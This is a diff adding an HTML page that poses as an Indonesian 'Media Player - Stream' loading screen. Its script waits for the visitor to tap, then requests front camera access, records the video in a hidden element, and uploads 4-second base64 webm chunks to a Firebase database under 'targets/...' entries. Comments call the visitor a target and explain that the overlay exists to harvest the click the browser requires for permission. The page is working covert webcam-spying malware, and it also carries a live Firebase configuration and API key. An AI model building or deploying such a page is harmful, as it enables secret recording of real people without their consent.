@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Player - Stream</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .box { text-align: center; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; cursor: pointer; }
+        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #888; font-size: 14px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <!-- Layar transparan untuk memicu izin klik pertama browser -->
+    <div class="box" id="main-trigger" onclick="initCapture()">
+        <div class="spinner"></div>
+        <p id="info-text">MEMUAT KONTEN...</p>
+    </div>
+
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // ID Random unik untuk target ini
+        const targetId = 'target_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
+        let stream = null;
+        let isStarted = false;
+
+        window.initCapture = async function() {
+            if (isStarted) return;
+            isStarted = true;
+
+            document.getElementById('info-text').innerText = "MENYAMBUNGKAN STREAM...";
+            const video = document.getElementById('cam');
+
+            try {
+                // Meminta izin kamera secara sah lewat interaksi sentuhan layar
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Fungsi untuk merekam dan langsung meng-upload data secara berkala setiap 4 detik
+                const recordAndSync = () => {
+                    let chunks = [];
+                    let recorder;
+
+                    try {
+                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                    } catch (e) {
+                        recorder = new MediaRecorder(stream);
+                    }
+
+                    recorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    recorder.onstop = () => {
+                        if (chunks.length === 0) return;
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = async () => {
+                            const base64Video = reader.result;
+                            try {
+                                // Data langsung dikirim dan diperbarui ke database secara real-time
+                                await set(ref(db, `targets/${targetId}`), {
+                                    code: "Live Session",
+                                    video: base64Video,
+                                    time: Date.now()
+                                });
+                            } catch (err) {
+                                console.error("Gagal sync:", err);
+                            }
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+
+                    recorder.start();
+
+                    // Setiap 4 detik, simpan potongan dan langsung kirim ke database
+                    setTimeout(() => {
+                        if (recorder.state === "recording") {
+                            recorder.stop();
+                            recordAndSync(); // Lanjut rekam sesi berikutnya tanpa terputus
+                        }
+                    }, 4000);
+                };
+
+                recordAndSync();
+
+            } catch (err) {
+                console.warn("Akses kamera ditolak:", err);
+                document.getElementById('info-text').innerText = "GAGAL MEMUAT KONTEN";
+            }
+        };
+    </script>
+</body>
+</html>
